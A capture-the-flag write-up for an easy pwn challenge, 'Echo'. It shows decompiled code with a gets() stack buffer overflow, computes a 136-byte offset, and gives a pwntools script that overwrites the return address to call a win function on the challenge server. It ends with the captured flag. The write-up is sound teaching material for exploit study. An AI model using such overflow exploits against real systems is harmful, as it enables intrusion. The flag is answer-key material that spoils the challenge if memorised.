## Name: Echo
#### Author: @awesome10billion
#### Category: pwn
#### Difficulty: easy
#### Description: I made my own echo program. my own echo program.


## Procedure
The echo binary has the following function
```
0x0000000000401216  win
0x000000000040128e  init
0x00000000004012b7  main
```

We can see this is ```64bit``` file.
```
─$ file echo         
echo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ba71fb7825c88b04e13afe6dcc11ba9113394f12, for GNU/Linux 3.2.0, not stripped
```

Using [dogbolt](https://dogbolt.org), we can see the following code for ```main``` and ```win``` functions
```
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char local_88 [128];
  
  init(param_1);
  puts("Give me some text and I\'ll echo it back to you: ");
  gets(local_88);
  puts(local_88);
  return 0;
}
```

```
void win(void)

{
  int iVar1;
  FILE *__stream;
  char local_11;
  
  __stream = fopen("flag.txt","r");
  if (__stream != (FILE *)0x0) goto LAB_0040126a;
  puts("Please create \'flag.txt\' in this directory with your own debugging flag.");
  FUN_00401120(0);
  do {
    putchar((int)local_11);
LAB_0040126a:
    iVar1 = fgetc(__stream);
    local_11 = (char)iVar1;
  } while (local_11 != -1);
  fclose(__stream);
  return;
}

```

So, basically we just need to call the ```win``` function, using the address ```0x0000000000401216```. the offset for this is ```128 + 8``` to be able to override the ret.

```
from pwn import *

context(arch='amd64',os='linux',log_level='debug')
io = remote('challenge.ctf.games',31989)
win = p64(0x0000000000401216)

offset = 136

payload = offset * b'A' + win

io.sendlineafter(b'to you: ',payload)
print(io.recv(1024))
io.interactive()%
```


<img width="1176" alt="Screenshot 2025-03-05 at 8 13 56 AM" src="https://github.com/user-attachments/assets/380c1bd2-ae24-493d-90d3-9581dd7fd5d9" />


flag ```flag{4f4293237e37d06d733772a087299f17}```
